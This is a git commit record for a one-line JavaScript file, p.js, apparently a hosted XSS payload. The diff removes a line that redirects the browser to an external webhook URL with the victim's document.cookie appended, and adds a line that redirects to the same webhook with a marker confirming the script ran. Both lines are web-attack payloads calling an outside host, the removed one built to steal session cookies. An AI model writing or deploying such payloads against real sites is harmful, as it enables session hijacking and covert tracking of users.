768eaaf76329ffeb312ddb6f7af38bee34c95c23
Sunny7890987 <sunny7890987@gmail.com>
2026-03-08 11:43:01 +0800

    Update URL for location assignment in p.jsdsf

--- p.js
+++ p.js
@@ -1,1 +1,1 @@
-location = 'https://webhooksite.net/52171b76-aa05-4092-8a80-55bc9eb48fca?c=' + encodeURIComponent(document.cookie);
+location='https://webhooksite.net/52171b76-aa05-4092-8a80-55bc9eb48fca?s=pjs_ran'
